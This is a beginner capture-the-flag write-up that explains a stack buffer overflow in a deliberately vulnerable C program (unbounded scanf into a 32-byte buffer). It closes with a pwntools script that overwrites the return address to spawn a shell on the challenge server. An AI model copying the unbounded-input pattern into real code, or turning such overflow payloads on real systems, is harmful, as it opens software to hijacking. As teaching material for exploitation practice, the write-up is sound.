# Shell

---

### Challenge Description

> Try to exploit this to get a shell!

> The challenge service is at:
3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg:30601

---

### Solution Breakdown for Dummies 

We are given a binary and its source code. 

We first take a look at the source code

```c
void shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[32];
    setup_IO();

    printf("Input: ");
    scanf("%s", buf);

    return 0;
}
```

First we can see a shell function which pops a shell.

```c
void shell()
{
    system("/bin/sh");
}
```

 ` scanf("%s", buf); `
 
Next, as we move down the code, we can see, our main function takes in an input with scanf, but it does not limit the number of characters that it takes in. 

 `char buf[32];`

It saves this input into a variable buffer which holds 32 characters.

If we can input more than 32 characters, we can overflow other variables in the stack. What's the stack? How does the stack look!? 

Let's read on the code first. 

At the end of the main function, it calls `return 0;`. What this does is that it returns to an address in a previous function and executes the instructions there.

What is currently at the return address is however, not of concern.

However, if we can somehow set the return address to the address of our shell function, the main function would return to the shell function and executes /bin/sh, giving us code execution.

How can we do that? Let's visualize the stack.

![mem (1)](https://user-images.githubusercontent.com/76640319/114257043-c4a03800-99ef-11eb-923c-9088d6162e34.jpg)

So we have an input, we first want to overflow the 32 characters of the buf variable. 

Next, we want to fill up the bytes between buf and return address. This will be 8 characters in 32 bit binary. **(its a fact)**

Next, we want to find out the address of the shell function. We can do this in many ways. 

1. We can find it on objdump.

![image](https://user-images.githubusercontent.com/76640319/114257094-42644380-99f0-11eb-8319-0b29c22e2a13.png)

2. We can find it using nm.

![image](https://user-images.githubusercontent.com/76640319/114257098-485a2480-99f0-11eb-9a68-811960cbb9d5.png)

3. We can use gdb.

![image](https://user-images.githubusercontent.com/76640319/114257107-5ad45e00-99f0-11eb-80fe-f5737fc69cd3.png)

Okay, now we have everything we did. Let's write our script.

```py
from pwn import * 
#import pwntools

p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30601)
#connect to remote service

shelladdr = p32(0x08048569) 
#shell address in little endian

payload = b''
payload += b"A"*32 # overflow buf
payload += b"A"*8 #reach return addr
payload += shelladdr #overwrite return address with shell address so it returns to and executes shell

p.sendline(payload) #send payload
p.interactive() #pop a shell
```

![image](https://user-images.githubusercontent.com/76640319/114257224-e77f1c00-99f0-11eb-8e98-2c6443c29e5e.png)

We have successfully popped a shell!!

Now I believe that you can find the flag yourself :) Good luck pwners.
